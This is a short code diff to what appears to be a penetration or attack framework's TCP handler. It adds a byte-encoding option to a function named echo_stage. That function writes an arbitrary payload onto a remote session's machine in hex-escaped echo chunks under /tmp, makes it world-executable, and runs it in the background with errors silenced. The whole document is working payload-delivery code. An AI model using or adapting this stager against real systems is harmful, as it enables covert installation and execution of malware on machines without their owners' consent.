@@ -61,7 +61,7 @@ class Handler(TCP):
             self.badges.output_error("Failed to handle session!")
             return None
 
-    def echo_stage(self, payload, sender, args=None, location='/tmp'):
+    def echo_stage(self, payload, sender, args=None, location='/tmp', encode=False):
         self.badges.output_process("Sending payload stage...")
         filename = binascii.hexlify(os.urandom(8)).decode()
         path = location + '/' + filename
@@ -81,7 +81,11 @@ class Handler(TCP):
             block = str(binascii.hexlify(payload[current:current + echo_max_length]), "utf-8")
             block = echo_prefix + echo_prefix.join(a + b for a, b in zip(block[::2], block[1::2]))
             command = echo_stream.format(block, path)
-            sender(command)
+
+            if encode:
+                sender((command + '\n').encode())
+            else:
+                sender(command)
 
         args = args if args is not None else ""
         sender(f"chmod 777 {path}; sh -c '{path} {args}' 2>/dev/null &")
